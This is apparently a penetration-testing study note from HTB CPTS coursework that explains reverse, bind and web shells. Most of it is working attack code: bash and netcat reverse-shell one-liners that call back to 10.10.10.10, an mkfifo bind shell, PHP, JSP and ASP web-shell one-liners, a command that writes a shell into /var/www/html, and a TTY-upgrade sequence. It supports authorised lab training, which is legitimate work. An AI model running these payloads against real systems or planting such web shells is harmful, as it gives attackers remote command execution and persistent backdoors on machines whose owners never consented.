---
tags:
  - Shell
  - CPTS
  - Material
  - HTB
---
# Types of Shells

> Once we compromise a system and exploit a vulnerability to execute commands remotely, we need a reliable connection giving us direct access to the system's shell (Bash or PowerShell), so we don't have to keep re-exploiting the same vulnerability for each command.

> [!note]
> Network protocols like SSH (Linux) or WinRM (Windows) also allow remote login, but require working credentials — which we usually don't have until after gaining command execution some other way.

> [!info]- The three main shell types
> - **Reverse Shell** — connects back to our system and gives us control through a reverse connection.
> - **Bind Shell** — waits for us to connect to it, and gives us control once we do.
> - **Web Shell** — communicates through a web server, accepts commands via HTTP parameters, executes them, and prints the output.

---
## Reverse Shell

> The most common type, as it's the quickest and easiest way to gain control. After finding an RCE vulnerability, we start a netcat listener on our machine, then run a reverse shell command on the target that connects its shell back to our listener.

> [!important]
> A reverse shell is fragile: if the connection drops or the command stops, we must re-run the initial exploit to regain access.

### Netcat Listener

Start a listener on a chosen port:

```shell
nc -lvnp 1234
```

> [!info]- Netcat listener flags
> - `-l` — listen mode, wait for a connection.
> - `-v` — verbose, so we know when a connection arrives.
> - `-n` — disable DNS resolution (IP only), to speed up the connection.
> - `-p 1234` — the port to listen on.

### Connect Back IP

Find our own IP (the target must connect back to it):

```shell
ip a
```

> [!note]
> On HTB, use the `tun0` IP — HTB boxes have no internet and reach us only over the VPN. In a real pentest you might use `eth0` or similar, depending on the network.

### Reverse Shell Command

The command depends on the target OS and available tools. Reliable examples:

```shell
bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
```

```shell
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
```

> [!info]- Reference
> [Payload All The Things](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#other-platforms) or [[Reverse Shell Cheatsheet]] has a comprehensive list of reverse shell commands for many OS/tool combinations.

On success, the listener receives the connection and we can type commands and get their output directly.

---
## Bind Shell

> Unlike a reverse shell (which connects to us), a bind shell listens on a port on the *target*, and we connect to it. Running the bind shell command binds the target's shell to a chosen port; we then connect with netcat to get control.

> [!important]
> If we drop the connection to a bind shell, we can simply reconnect. But if the bind shell command stops or the host reboots, access is lost and we must re-exploit.

### Bind Shell Command

Reliable example (Linux, listening on `0.0.0.0:1234` so we can connect from anywhere):

```shell
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
```

### Netcat Connection

Connect to the target's listening port:

```shell
nc 10.10.10.1 1234
```

This drops us directly into a shell on the target.

---
## Upgrading TTY

> A shell obtained through netcat is limited: no cursor movement, no command history. Upgrading the TTY maps our terminal to the remote TTY for a fully working shell.

Spawn a proper Bash PTY on the target:

```shell
python -c 'import pty; pty.spawn("/bin/bash")'
```

> [!caution]
> Full upgrade sequence:
> 1. Run the `pty.spawn` command above.
> 2. Hit `Ctrl+Z` to background the shell.
> 3. On the local terminal, run `stty raw -echo` then `fg`.
> 4. Press Enter (twice if needed), or type `reset`.

Fix the terminal size. First, get our own values from another terminal:

```shell
echo $TERM
```

```shell
stty size
```

Then set them in the netcat shell (rows and columns from `stty size`):

```shell
export TERM=xterm-256color
stty rows 67 columns 318
```

The shell now uses the terminal's full features, like an SSH connection.

---
## Web Shell

> A web shell is a web script (PHP, ASPX, etc.) that accepts a command via HTTP request parameters (GET or POST), executes it, and prints the output back on the web page.

### Writing a Web Shell

Common short one-liners:

```php
<?php system($_REQUEST["cmd"]); ?>
```

```jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

```asp
<% eval request("cmd") %>
```

### Uploading a Web Shell

> The web shell must be placed in the target's web directory (webroot) to be run through the browser — via an upload vulnerability, or by writing it directly if we already have command execution.

> [!info]- Default webroots
> - Apache — `/var/www/html/`
> - Nginx — `/usr/local/nginx/html/`
> - IIS — `c:\inetpub\wwwroot\`
> - XAMPP — `C:\xampp\htdocs\`

Write a PHP shell directly (Linux/Apache example):

```shell
echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php
```

### Accessing a Web Shell

Access via browser with the `cmd` parameter:
`http://SERVER_IP:PORT/shell.php?cmd=id`

Or with cURL:

```shell
curl http://SERVER_IP:PORT/shell.php?cmd=id
```

> [!important]
> Web shell advantages: bypasses firewall restrictions (runs on the existing web port, opens no new connection), and survives reboots (the file stays in place). Disadvantage: less interactive — each command means requesting a new URL.

---
